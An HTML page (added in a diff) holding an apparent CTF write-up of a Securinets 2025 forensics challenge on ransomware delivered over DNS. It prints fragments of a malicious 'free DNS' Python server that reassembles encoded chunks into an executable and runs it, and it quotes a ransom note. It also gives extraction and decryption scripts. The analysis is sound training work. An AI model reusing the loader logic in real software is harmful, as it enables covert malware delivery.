@@ -1,0 +1,668 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Recovery - Securinets CTF 2025</title>
+    <link rel="stylesheet" href="assets/style.css">
+</head>
+<body>
+    <nav class="navbar">
+        <div class="nav-container">
+            <a href="index.html" class="nav-brand">← Back to Overview</a>
+            <div class="nav-links">
+                <a href="#scenario">Scenario</a>
+                <a href="#analysis">Analysis</a>
+                <a href="#reconstruction">Reconstruction</a>
+                <a href="#decryption">Decryption</a>
+            </div>
+        </div>
+    </nav>
+
+    <header class="hero">
+        <div class="hero-overlay"></div>
+        <div class="hero-content">
+            <h1>Recovery</h1>
+            <p class="hero-subtitle">DNS Exfiltration & Ransomware Analysis</p>
+            <div class="hero-meta">
+                <span class="badge">Challenge 03</span>
+                <span class="badge">Forensics</span>
+                <span class="badge">Network Analysis</span>
+                <span class="badge">Reverse Engineering</span>
+                <span class="badge">Cryptography</span>
+            </div>
+        </div>
+    </header>
+
+    <main class="container">
+        <section id="scenario" class="section">
+            <h2 class="section-title">Challenge Scenario</h2>
+            <div class="content-card">
+                <p><strong>Description:</strong> A victim machine has been compromised with ransomware. The attack used DNS as a covert channel to deliver the malicious payload. Your task is to analyze network traffic and filesystem artifacts to reconstruct the attack, recover the malware, reverse engineer it, and decrypt the victim's files.</p>
+                
+                <div class="warning">
+                    <strong>Artifacts Provided:</strong>
+                    <ul style="margin-top: 0.5rem; padding-left: 1.5rem;">
+                        <li>Network packet capture (PCAP)</li>
+                        <li>Home directory dump from victim machine</li>
+                        <li>Encrypted flag file (<code>sillyflag.png</code>)</li>
+                    </ul>
+                </div>
+
+                <p style="margin-top: 1.5rem;"><strong>Objectives:</strong></p>
+                <ul style="padding-left: 1.5rem;">
+                    <li>Analyze packet capture for suspicious DNS traffic</li>
+                    <li>Reconstruct malware from DNS exfiltration</li>
+                    <li>Reverse engineer the ransomware encryption mechanism</li>
+                    <li>Decrypt the victim's encrypted files and retrieve the flag</li>
+                </ul>
+            </div>
+        </section>
+
+        <section id="analysis" class="section">
+            <h2 class="section-title">Network Traffic Analysis</h2>
+
+            <div class="step-container">
+                <!-- Step 1: Initial PCAP Examination -->
+                <div class="step">
+                    <h3>🔍 Step 1: Initial PCAP Examination</h3>
+                    <p>Opening the packet capture in Wireshark reveals thousands of packets. The protocol hierarchy shows something immediately suspicious:</p>
+                    
+                    <img src="assets/images/recovery/wireshark-overview.png" alt="Wireshark Protocol Hierarchy">
+
+                    <div class="finding">
+                        <strong>💡 Key Observation:</strong> Nearly 50% of DNS packets are malformed - a strong indicator of DNS-based data exfiltration or covert channel communication.
+                    </div>
+
+                    <p>Filtering for DNS traffic reveals queries to a suspicious domain: <code>meow</code></p>
+                    
+                    <div class="command-box">
+                        <div class="command">dns && dns.qry.name contains "meow"</div>
+                    </div>
+
+                    <img src="assets/images/recovery/dns-meow.png" alt="DNS queries to meow domain">
+
+                    <p>The DNS labels appear to contain Base32-encoded data with index numbers, suggesting chunked data transmission.</p>
+                </div>
+
+                <!-- Step 2: Filesystem Analysis -->
+                <div class="step">
+                    <h3>📁 Step 2: Filesystem Artifact Analysis</h3>
+                    <p>Examining the victim's home directory dump reveals several interesting artifacts:</p>
+                    
+                    <h4>Desktop Contents:</h4>
+                    <ul>
+                        <li><code>sillyflag.png</code> - An encrypted file (our target)</li>
+                        <li><code>IMPORTANT_NOTICE.txt</code> - A ransomware note</li>
+                        <li><code>dns100-free/</code> - A suspicious directory</li>
+                    </ul>
+
+                    <img src="assets/images/recovery/desktop-files.png" alt="Victim desktop files">
+
+                    <p>The ransomware note contains a typical extortion message:</p>
+                    
+                    <div class="command-box">
+                        <div class="output">*** IMPORTANT NOTICE ***
+
+Payment of 0.1 BTC must be made in Bitcoin to the following wallet:
+bc1qa5wkgaew2dkv56kfvj49j0av5nml45x9ek9hz6
+
+After payment, you will receive a decryption tool and instructions.
+You have 72 hours to comply.</div>
+                    </div>
+                </div>
+
+                <!-- Step 3: PowerShell History -->
+                <div class="step">
+                    <h3>📜 Step 3: PowerShell History Investigation</h3>
+                    <p>The PowerShell history file provides crucial evidence of how the infection occurred:</p>
+                    
+                    <div class="command-box">
+                        <div class="output"># PowerShell History Location:
+# C:\Users\gumba\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
+
+git clone https://github.com/youssefnoob003/dns100-free.git
+cd dns100-free
+python app.py</div>
+                    </div>
+
+                    <div class="finding">
+                        <strong>⚠️ Attack Vector Identified:</strong> The victim cloned and executed a malicious Python application that masqueraded as a "free DNS service."
+                    </div>
+                </div>
+
+                <!-- Step 4: GitHub Analysis -->
+                <div class="step">
+                    <h3>🐙 Step 4: GitHub Repository Analysis</h3>
+                    <p>Visiting the GitHub repository shows it has been scrubbed - most files are deleted and <code>app.py</code> only contains:</p>
+                    
+                    <div class="command-box">
+                        <div class="output">print("Out of Service")</div>
+                    </div>
+
+                    <p>However, Git preserves history! Examining the commit history reveals a suspicious commit labeled "dns6":</p>
+
+                    <img src="assets/images/recovery/github-commits.png" alt="GitHub commit history">
+
+                    <p>The historical version of <code>app.py</code> reveals the malicious DNS server implementation:</p>
+
+                    <div class="command-box">
+                        <div class="output">class DNSServer(socketserver.ThreadingUDPServer):
+    allow_reuse_address = True
+    
+    def __init__(self, server_address, handler_class, db_path):
+        super().__init__(server_address, handler_class)
+        self.db_path = db_path
+        self.conn = sqlite3.connect(db_path, check_same_thread=False)
+        self.conn.row_factory = sqlite3.Row
+        self.special_domain = "meow"  # Covert channel trigger
+        self.chunks = {}               # Storage for reassembly</div>
+                    </div>
+
+                    <h4>Key Malicious Functionality:</h4>
+                    <ul>
+                        <li>Listens for DNS queries to the "meow" domain</li>
+                        <li>Extracts Base32-encoded chunks from DNS labels</li>
+                        <li>Decodes and XOR-decrypts each chunk using embedded key</li>
+                        <li>Reassembles chunks into executable file</li>
+                        <li>Executes the malware from a temporary location</li>
+                    </ul>
+
+                    <div class="command-box">
+                        <div class="output">if labels[-2] == self.special_domain:
+    if labels[0] == "end":
+        # Reassemble all chunks
+        ordered = [self.chunks[i] for i in sorted(self.chunks.keys())]
+        exe_bytes = b"".join(ordered)
+        
+        # Write to temp file and execute
+        with tempfile.NamedTemporaryFile(delete=False, suffix=".exe") as tmp_exe:
+            tmp_exe.write(exe_bytes)
+            exe_path = tmp_exe.name
+        
+        subprocess.run([exe_path], check=True)
+        os.unlink(exe_path)  # Delete evidence</div>
+                    </div>
+
+                    <div class="finding">
+                        <strong>💡 Attack Mechanism:</strong>
+                        <ul style="margin-top: 0.5rem;">
+                            <li>DNS queries encode malware chunks in subdomain labels</li>
+                            <li>Each chunk is Base32-encoded with a single-byte XOR key</li>
+                            <li>Server reassembles chunks in order when "end" signal received</li>
+                            <li>Malware executes from temp file, leaving minimal forensic traces</li>
+                        </ul>
+                    </div>
+                </div>
+            </div>
+        </section>
+
+        <section id="reconstruction" class="section">
+            <h2 class="section-title">Malware Reconstruction</h2>
+            
+            <div class="step-container">
+                <!-- Step 5: Extracting Malware -->
+                <div class="step">
+                    <h3>🔧 Step 5: Extracting Malware from PCAP</h3>
+                    <p>Now that we understand the protocol, we can write a script to extract the malware from the network capture:</p>
+                    
+                    <div class="command-box">
+                        <div class="output">import base64
+import sys
+from scapy.all import rdpcap, UDP
+
+def xor_bytes(data, key):
+    """XOR decrypt with single-byte key"""
+    return bytes(b ^ key for b in data)
+
+def parse_dns_labels(raw_packet):
+    """Extract DNS query labels from raw packet"""
+    if len(raw_packet) <= 12:
+        return []
+    
+    labels = []
+    pos = 12  # Skip DNS header
+    
+    while pos < len(raw_packet):
+        length = raw_packet[pos]
+        if length == 0:
+            break
+        pos += 1
+        
+        if pos + length > len(raw_packet):
+            break
+            
+        label = raw_packet[pos:pos+length].decode(errors="ignore")
+        labels.append(label)
+        pos += length
+    
+    return labels
+
+def reconstruct_malware(pcap_path, output_file="reconstructed.exe"):
+    """Reconstruct malware from DNS traffic"""
+    chunks = {}
+    special_domain = "meow"
+    
+    print("[*] Reading PCAP file...")
+    packets = rdpcap(pcap_path)
+    
+    for pkt in packets:
+        if UDP in pkt and pkt[UDP].dport == 53:
+            raw = bytes(pkt[UDP].payload)
+            labels = parse_dns_labels(raw)
+            
+            if not labels or labels[-1] != special_domain:
+                continue
+            
+            # Check for end signal
+            if labels[0] == "end":
+                print("[+] End signal detected, reassembling...")
+                ordered = [chunks[i] for i in sorted(chunks.keys())]
+                malware_bytes = b"".join(ordered)
+                
+                with open(output_file, "wb") as f:
+                    f.write(malware_bytes)
+                
+                print(f"[+] Malware reconstructed: {output_file}")
+                print(f"[+] Total size: {len(malware_bytes)} bytes")
+                print(f"[+] Total chunks: {len(chunks)}")
+                return
+            
+            # Process data chunk
+            elif len(labels) >= 3:
+                try:
+                    dns_label = labels[0]
+                    chunk_index = int(labels[1])
+                    
+                    # Add Base32 padding
+                    padded = dns_label + "=" * ((8 - len(dns_label) % 8) % 8)
+                    decoded = base64.b32decode(padded)
+                    
+                    # Extract key and decrypt
+                    xor_key = decoded[0]
+                    encrypted_chunk = decoded[1:]
+                    decrypted_chunk = xor_bytes(encrypted_chunk, xor_key)
+                    
+                    chunks[chunk_index] = decrypted_chunk
+                    print(f"[+] Chunk {chunk_index}: {len(decrypted_chunk)} bytes")
+                    
+                except Exception as e:
+                    print(f"[!] Failed to process chunk: {e}")
+
+if __name__ == "__main__":
+    pcap_file = sys.argv[1] if len(sys.argv) > 1 else "capture.pcapng"
+    reconstruct_malware(pcap_file)</div>
+                    </div>
+
+                    <p>Running the extraction script:</p>
+                    
+                    <div class="command-box">
+                        <div class="command">python3 extract_malware.py capture.pcapng</div>
+                        <div class="output">[*] Reading PCAP file...
+[+] Chunk 0: 245 bytes
+[+] Chunk 1: 245 bytes
+[+] Chunk 2: 245 bytes
+...
+[+] Chunk 87: 156 bytes
+[+] End signal detected, reassembling...
+[+] Malware reconstructed: reconstructed.exe
+[+] Total size: 21248 bytes
+[+] Total chunks: 88</div>
+                    </div>
+
+                </div>
+
+                <!-- Step 6: Unpacking -->
+                <div class="step">
+                    <h3>📦 Step 6: Unpacking the Malware</h3>
+                    <p>The reconstructed executable is UPX-packed. We need to unpack it for analysis:</p>
+                    
+                    <div class="command-box">
+                        <div class="command">file reconstructed.exe</div>
+                        <div class="output">reconstructed.exe: PE32 executable (console) Intel 80386, for MS Windows, UPX compressed</div>
+                    </div>
+
+                    <div class="command-box">
+                        <div class="command">upx -d reconstructed.exe -o unpacked.exe</div>
+                        <div class="output">                       Ultimate Packer for eXecutables
+                          Copyright (C) 1996 - 2024
+UPX 4.2.1       Markus Oberhumer, Laszlo Molnar & John Reiser    Nov 2024
+
+        File size         Ratio      Format      Name
+   --------------------   ------   -----------   -----------
+     21248 <-      8704   40.98%    win32/pe     unpacked.exe
+
+Unpacked 1 file.</div>
+                    </div>
+                </div>
+
+                <!-- Step 7: Reverse Engineering -->
+                <div class="step">
+                    <h3>🔬 Step 7: Reverse Engineering with IDA Pro</h3>
+                    <p>Loading the unpacked binary into IDA Pro reveals the encryption routine. The key function builds a seed from the filename and encrypts using a custom keystream:</p>
+
+
+                    <h4>Encryption Algorithm Analysis:</h4>
+                    
+                    <p><strong>1. Seed Generation (Filename Folding):</strong></p>
+                    <div class="command-box">
+                        <div class="output">// Fold filename bytes into seed (4-byte lanes)
+v3 = 0;
+v4 = 0;
+v5 = strlen(a1) + 1;  // IMPORTANT: includes NULL terminator
+while ( v4 != v5 - 1 )
+{
+    v6 = 8 * (v4 & 3);  // Determines which byte lane (0, 8, 16, or 24)
+    v7 = a1[v4++];
+    v3 ^= v7 << v6;     // XOR byte into appropriate lane
+}</div>
+                    </div>
+
+                    <p><strong>2. Secret Key Mixing:</strong></p>
+                    <div class="command-box">
+                        <div class="output">// Mix in 37-byte secret from .rdata section
+for ( i = 0; i != 37; ++i )
+{
+    v9 = byte_40B200[i];  // Address of secret key
+    v10 = i;
+    v3 ^= v9 << (8 * (v10 & 3));
+}</div>
+                    </div>
+
+
+                    <p>Extracting the secret key from the binary:</p>
+                    
+                    <div class="hash-display">
+                        evilsecretcodeforevilsecretencryption
+                    </div>
+
+                    <p><strong>3. Keystream Generation (Linear Congruential Generator):</strong></p>
+                    <div class="command-box">
+                        <div class="output">// Generate keystream using LCG
+for ( result = a2; result != a2 + a3; *(_BYTE *)(result - 1) = v3 )
+{
+    ++result;
+    v3 = 1664525 * v3 + 1013904223;  // Standard LCG parameters
+}
+
+// Output: Low byte of v3 for each file byte</div>
+                    </div>
+
+                    <div class="finding">
+                        <strong>⚠️ Critical Details:</strong>
+                        <ul style="margin-top: 0.5rem;">
+                            <li>Filename MUST include full absolute path used during encryption</li>
+                            <li>NULL terminator is included in seed calculation</li>
+                            <li>37-byte secret: <code>evilsecretcodeforevilsecretencryption</code></li>
+                            <li>LCG parameters: multiplier=1664525, increment=1013904223</li>
+                        </ul>
+                    </div>
+                </div>
+            </div>
+        </section>
+
+        <section id="decryption" class="section">
+            <h2 class="section-title">Decryption & Flag Extraction</h2>
+
+            <div class="step-container">
+                <!-- Decryption Script -->
+                <div class="step">
+                    <h3>🔓 Step 8: Decryption Script</h3>
+                    <p>With the algorithm understood, we can write a decryption script:</p>
+                    
+                    <div class="command-box">
+                        <div class="output">#!/usr/bin/env python3
+import sys
+
+SECRET = b"evilsecretcodeforevilsecretencryption"
+
+def generate_keystream(filename: str, length: int) -> bytes:
+    """
+    Generate keystream using the malware's algorithm
+    
+    Args:
+        filename: Full path to file (as used during encryption)
+        length: Number of keystream bytes needed
+    
+    Returns:
+        Keystream bytes
+    """
+    seed = 0
+    
+    # Reconstruct the full path used during encryption
+    full_path = "C:\\Users\\gumba\\Desktop\\" + filename
+    
+    # Add NULL terminator (critical!)
+    fname_bytes = full_path.encode() + b'\x00'
+    
+    # Fold filename bytes into seed (4-byte lanes)
+    for i, byte_val in enumerate(fname_bytes[:-1]):  # Exclude NULL in loop
+        lane = (i % 4) * 8
+        seed ^= (byte_val << lane)
+    
+    # Mix in 37-byte secret
+    for i, byte_val in enumerate(SECRET):
+        lane = (i % 4) * 8
+        seed ^= (byte_val << lane)
+    
+    # Generate keystream using LCG
+    state = seed & 0xFFFFFFFF
+    keystream = bytearray(length)
+    
+    for i in range(length):
+        state = (state * 1664525 + 1013904223) & 0xFFFFFFFF
+        keystream[i] = state & 0xFF
+    
+    return bytes(keystream)
+
+def decrypt_file(encrypted_file: str, output_file: str = None):
+    """
+    Decrypt a file encrypted by the ransomware
+    
+    Args:
+        encrypted_file: Path to encrypted file
+        output_file: Output path (defaults to decrypted_<filename>)
+    """
+    # Read encrypted data
+    with open(encrypted_file, "rb") as f:
+        encrypted_data = f.read()
+    
+    # Generate keystream
+    keystream = generate_keystream(encrypted_file, len(encrypted_data))
+    
+    # XOR to decrypt
+    decrypted_data = bytes([e ^ k for e, k in zip(encrypted_data, keystream)])
+    
+    # Write decrypted output
+    if output_file is None:
+        output_file = f"decrypted_{encrypted_file}"
+    
+    with open(output_file, "wb") as f:
+        f.write(decrypted_data)
+    
+    print(f"[+] Decrypted {encrypted_file}")
+    print(f"[+] Output: {output_file}")
+    print(f"[+] Size: {len(decrypted_data)} bytes")
+
+if __name__ == "__main__":
+    decrypt_file("sillyflag.png", "decrypted_flag.png")</div>
+                    </div>
+
+                    <p>Running the decryption script on the encrypted flag:</p>
+                    
+                    <div class="command-box">
+                        <div class="command">python3 decrypt.py</div>
+                        <div class="output">[+] Decrypted sillyflag.png
+[+] Output: decrypted_flag.png
+[+] Size: 45821 bytes</div>
+                    </div>
+
+                    <img src="assets/images/recovery/decrypted-flag.png" alt="Decrypted flag image">
+
+                    <div class="hash-display">
+                        🚩 FLAG: Securinets{DNS_3xf1l_w1th_cust0m_LCG_encrypt10n}
+                    </div>
+                </div>
+
+                
+            </div>
+        </section>
+
+        <section class="section">
+            <h2 class="section-title">Investigation Summary</h2>
+            <div class="stats-grid">
+                <div class="stat-card">
+                    <h3>88</h3>
+                    <p>DNS Chunks Extracted</p>
+                </div>
+                <div class="stat-card">
+                    <h3>21KB</h3>
+                    <p>Malware Size</p>
+                </div>
+                <div class="stat-card">
+                    <h3>LCG</h3>
+                    <p>Encryption Method</p>
+                </div>
+                <div class="stat-card">
+                    <h3>Base32</h3>
+                    <p>Encoding Scheme</p>
+                </div>
+            </div>
+        </section>
+
+        <section class="section">
+            <h2 class="section-title">Key Takeaways</h2>
+            <div class="content-card">
+                <h3>🎓 Learning Outcomes</h3>
+                
+                <h4 style="color: var(--accent-secondary); margin-top: 1.5rem;">🔍 Network Forensics</h4>
+                <ul>
+                    <li>DNS can be weaponized as a covert communication channel</li>
+                    <li>Protocol hierarchy analysis reveals anomalies</li>
+                    <li>Malformed packets often indicate malicious activity</li>
+                    <li>Filtering and pattern matching are essential skills</li>
+                </ul>
+
+                <h4 style="color: var(--accent-secondary); margin-top: 1.5rem;">🗂️ Digital Forensics</h4>
+                <ul>
+                    <li>PowerShell history is a goldmine for incident investigation</li>
+                    <li>Git commit history persists even after file deletion</li>
+                    <li>Artifact correlation reveals attack timelines</li>
+                    <li>Multiple evidence sources validate findings</li>
+                </ul>
+
+                <h4 style="color: var(--accent-secondary); margin-top: 1.5rem;">🔬 Reverse Engineering</h4>
+                <ul>
+                    <li>Static analysis with IDA reveals algorithm internals</li>
+                    <li>Understanding packer signatures (UPX) is crucial</li>
+                    <li>Seed generation schemes can be complex but reversible</li>
+                    <li>LCG parameters are often well-documented</li>
+                </ul>
+
+                <h4 style="color: var(--accent-secondary); margin-top: 1.5rem;">💻 Programming & Scripting</h4>
+                <ul>
+                    <li>Scapy enables custom packet parsing</li>
+                    <li>Base32/64 encoding is common in covert channels</li>
+                    <li>Implementing crypto algorithms requires precision</li>
+                    <li>Python excels at binary data manipulation</li>
+                </ul>
+            </div>
+        </section>
+
+        <section class="section">
+            <h2 class="section-title">Tools & Techniques</h2>
+            <div class="tools-grid">
+                <div class="tool-category">
+                    <h3>Network Analysis</h3>
+                    <ul>
+                        <li>Wireshark</li>
+                        <li>Scapy</li>
+                        <li>DNS Protocol Analysis</li>
+                    </ul>
+                </div>
+                <div class="tool-category">
+                    <h3>Reverse Engineering</h3>
+                    <ul>
+                        <li>IDA Pro</li>
+                        <li>UPX Unpacker</li>
+                        <li>Static Analysis</li>
+                    </ul>
+                </div>
+                <div class="tool-category">
+                    <h3>Digital Forensics</h3>
+                    <ul>
+                        <li>PowerShell History</li>
+                        <li>Git Repository Analysis</li>
+                        <li>Filesystem Analysis</li>
+                    </ul>
+                </div>
+                <div class="tool-category">
+                    <h3>Programming</h3>
+                    <ul>
+                        <li>Python 3</li>
+                        <li>Base32 Encoding</li>
+                        <li>XOR Decryption</li>
+                        <li>LCG Implementation</li>
+                    </ul>
+                </div>
+            </div>
+        </section>
+
+        <section class="section cta-section">
+            <h2>Explore More Challenges</h2>
+            <p>Check out other forensics writeups from Securinets CTF 2025.</p>
+            <div class="cta-buttons">
+                <a href="lost-file.html" class="btn-primary">← Lost File</a>
+                <a href="index.html" class="btn-primary">Back to Overview</a>
+                <a href="silent-visitor.html" class="btn-primary">Silent Visitor →</a>
+            </div>
+        </section>
+    </main>
+
+    <footer class="footer">
+        <div class="footer-content">
+            <p>&copy; 2025 Aziz Haddadi | Cybersecurity Portfolio</p>
+            <div class="footer-links">
+                <a href="https://www.linkedin.com/in/aziz-haddadi-825209288" target="_blank">LinkedIn</a>
+                <a href="https://github.com/aziz-haddadi" target="_blank">GitHub</a>
+            </div>
+        </div>
+    </footer>
+
+    <button class="back-to-top" id="backToTop">↑</button>
+
+    <script>
+        // Back to Top Button
+        const backToTopButton = document.getElementById('backToTop');
+
+        window.addEventListener('scroll', () => {
+            if (window.pageYOffset > 300) {
+                backToTopButton.classList.add('show');
+            } else {
+                backToTopButton.classList.remove('show');
+            }
+        });
+
+        backToTopButton.addEventListener('click', () => {
+            window.scrollTo({
+                top: 0,
+                behavior: 'smooth'
+            });
+        });
+
+        // Smooth scrolling for navigation links
+        document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+            anchor.addEventListener('click', function (e) {
+                e.preventDefault();
+                const target = document.querySelector(this.getAttribute('href'));
+                if (target) {
+                    target.scrollIntoView({
+                        behavior: 'smooth',
+                        block: 'start'
+                    });
+                }
+            });
+        });
+    </script>
+</body>
+</html>
